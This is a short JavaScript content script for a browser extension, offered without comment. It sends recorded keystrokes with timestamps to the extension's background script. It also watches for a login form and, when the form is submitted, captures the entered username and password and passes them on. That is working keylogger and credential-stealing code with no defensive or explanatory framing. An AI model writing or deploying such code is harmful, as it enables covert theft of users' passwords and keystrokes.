function sendKeylogToBackground(key, timestamp) {
    chrome.runtime.sendMessage({ action: 'addKeylog', key: key, timestamp: timestamp });
}

function monitorLoginForm() {
    var loginForm = document.querySelector('#login-form');
    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            var username = document.querySelector('input[name="_username"]').value;
            var password = document.querySelector('input[name="_password"]').value;
            chrome.runtime.sendMessage({ action: 'loginAttempt', username: username, password: password });
            return true;
        });
    } else {
        setTimeout(monitorLoginForm, 1000);
    }
}

monitorLoginForm();
